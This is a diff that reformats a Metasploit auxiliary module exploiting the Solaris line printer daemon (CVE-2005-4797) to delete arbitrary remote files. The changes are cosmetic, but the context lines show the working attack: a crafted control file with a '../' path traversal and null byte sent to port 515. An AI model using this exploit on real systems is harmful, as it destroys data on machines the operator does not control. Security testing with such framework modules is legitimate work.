@@ -8,45 +8,45 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Solaris LPD Arbitrary File Delete',
-      'Description'    => %q{
-        This module uses a vulnerability in the Solaris line printer
-        daemon to delete arbitrary files on an affected system. This
-        can be used to exploit the rpc.walld format string flaw, the
-        missing krb5.conf authentication bypass, or simply delete
-        system files. Tested on Solaris 2.6, 7, 8, 9, and 10.
-
-      },
-      'Author'         => [ 'hdm', 'Optyx <optyx[at]uberhax0r.net>' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Solaris LPD Arbitrary File Delete',
+        'Description' => %q{
+          This module uses a vulnerability in the Solaris line printer
+          daemon to delete arbitrary files on an affected system. This
+          can be used to exploit the rpc.walld format string flaw, the
+          missing krb5.conf authentication bypass, or simply delete
+          system files. Tested on Solaris 2.6, 7, 8, 9, and 10.
+        },
+        'Author' => [ 'hdm', 'Optyx <optyx[at]uberhax0r.net>' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2005-4797' ],
           [ 'BID', '14510' ],
           [ 'OSVDB', '18650' ]
         ]
-      ))
+      )
+    )
 
-      register_options(
-        [
-          Opt::RPORT(515),
-          OptString.new('RPATH', [ true, "The remote file path to delete"]),
-        ])
+    register_options(
+      [
+        Opt::RPORT(515),
+        OptString.new('RPATH', [ true, "The remote file path to delete"]),
+      ]
+    )
   end
 
   def run
-
-
-    r_hostname = Rex::Text.rand_text_alpha(rand(8)+1)
-    r_user     = Rex::Text.rand_text_alpha(rand(8)+1)
-    r_spool    = Rex::Text.rand_text_alpha(rand(8)+1)
+    r_hostname = Rex::Text.rand_text_alpha(rand(8) + 1)
+    r_user = Rex::Text.rand_text_alpha(rand(8) + 1)
+    r_spool = Rex::Text.rand_text_alpha(rand(8) + 1)
 
     # Create a simple control file...
     control = "H#{r_hostname}\nP#{r_user}\n";
 
     # The job ID is squashed down to three decimal digits
-    jid   = ($$ % 1000).to_s + [Time.now.to_i].pack('N').unpack('H*')[0]
+    jid = ($$ % 1000).to_s + [Time.now.to_i].pack('N').unpack('H*')[0]
 
     # Establish the first connection to the server
     sock1 = connect(false)
@@ -65,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
     # null byte will prevent the parser from processing the other paths.
     control << "U" + ("../" * 10) + "#{datastore['RPATH']}\x00\n"
 
-    dataf = Rex::Text.rand_text_alpha(100)+1
+    dataf = Rex::Text.rand_text_alpha(100) + 1
 
     print_status("Deleting #{datastore['RPATH']}...")
     if !(
@@ -80,8 +80,7 @@ class MetasploitModule < Msf::Auxiliary
     sock1.close
   end
 
-  def send_file(s, type, name, data='')
-
+  def send_file(s, type, name, data = '')
     s.put(type.chr + data.length.to_s + " " + name + "\n")
     res = s.get_once(1)
     if !(res and res[0] == ?\0)
